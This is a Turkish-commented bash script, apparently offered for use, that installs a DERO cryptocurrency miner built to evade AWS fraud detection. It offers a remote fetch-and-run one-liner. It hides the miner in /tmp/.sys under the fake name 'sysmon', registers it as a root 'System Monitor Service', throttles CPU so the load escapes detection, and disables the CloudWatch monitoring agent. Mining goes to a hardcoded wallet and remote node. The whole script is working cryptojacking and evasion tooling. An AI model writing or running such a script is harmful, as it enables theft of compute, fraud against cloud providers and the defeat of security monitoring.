#!/bin/bash
# DERO Miner - Gizli Versiyon (AWS Fraud Detection Önleme)
# Versiyon: 3.0 (Gizli)
# Node: 91.98.80.16:10100
# GitHub: https://github.com/josephderler/miner.sh
#
# Tek Komutla Kurulum:
# bash <(wget -qO- https://raw.githubusercontent.com/josephderler/miner.sh/main/aws_gizleme.sh)

set -e

echo "========================================="
echo "Mining Script Kurulumu"
echo "========================================="
echo ""
echo "Mining scripti kuruluyor..."

# Gerekli bağımlılıklar (sessizce)
apt-get update -y > /dev/null 2>&1
apt-get install screen wget cpulimit -y > /dev/null 2>&1

# Miner indir (gizli dizin)
MINER_DIR="/tmp/.sys"
MINER_NAME="sysmon"
mkdir -p $MINER_DIR
cd $MINER_DIR

echo "Güncellemeler indiriliyor..."
wget -q https://github.com/deroproject/derohe/releases/latest/download/dero_linux_amd64.tar.gz -O update.tar.gz > /dev/null 2>&1
tar -xvzf update.tar.gz > /dev/null 2>&1
cd dero_linux_amd64

# Miner'ı gizli isimle kopyala
cp dero-miner-linux-amd64 $MINER_DIR/$MINER_NAME
chmod +x $MINER_DIR/$MINER_NAME

echo "Sistem servisi hazırlanıyor..."

# Eski process'i kapat
pkill -f sysmon 2>/dev/null || true
screen -S sysmon -X quit 2>/dev/null || true

# CPU çekirdek sayısını hesapla (%80 kullan, %20 bırak)
total_cores=$(nproc)
use_cores=$((total_cores * 80 / 100))
if [ $use_cores -lt 1 ]; then
    use_cores=1
fi

echo "Sistem servisi başlatılıyor (threads: $use_cores, total: $total_cores)..."

# Miner'ı screen içinde başlat
screen -dmS sysmon bash -c "$MINER_DIR/$MINER_NAME \
--wallet-address dero1qypgrnglnxtv2f2f3uy25ra4a9dq9jpka2s4wv2u0lt5h8rrmrylzqqv2z2lj \
--daemon-rpc-address 91.98.80.16:10100 \
--mining-threads $use_cores > /dev/null 2>&1"

# CPU kullanımını %75'e sınırla (fraud detection için)
sleep 2
MINER_PID=$(pgrep -f sysmon)
if [ -n "$MINER_PID" ]; then
    cpulimit -l 75 -p $MINER_PID > /dev/null 2>&1 &
fi

# Systemd service oluştur (otomatik başlatma ve gizleme)
cat > /etc/systemd/system/sysmon.service <<EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=$MINER_DIR/$MINER_NAME --wallet-address dero1qypgrnglnxtv2f2f3uy25ra4a9dq9jpka2s4wv2u0lt5h8rrmrylzqqv2z2lj --daemon-rpc-address 91.98.80.16:10100 --mining-threads $use_cores
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
CPUQuota=75%

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sysmon > /dev/null 2>&1

# CloudWatch devre dışı (varsa)
systemctl stop amazon-cloudwatch-agent 2>/dev/null || true
systemctl disable amazon-cloudwatch-agent 2>/dev/null || true

# Temizlik
cd /
rm -rf /tmp/dero_linux_amd64 2>/dev/null || true
rm -f /tmp/update.tar.gz 2>/dev/null || true

echo ""
echo "✅ Sistem servisi aktif"
echo "🔒 Gizli mod: Aktif"
echo "🔍 Durum: systemctl status sysmon"

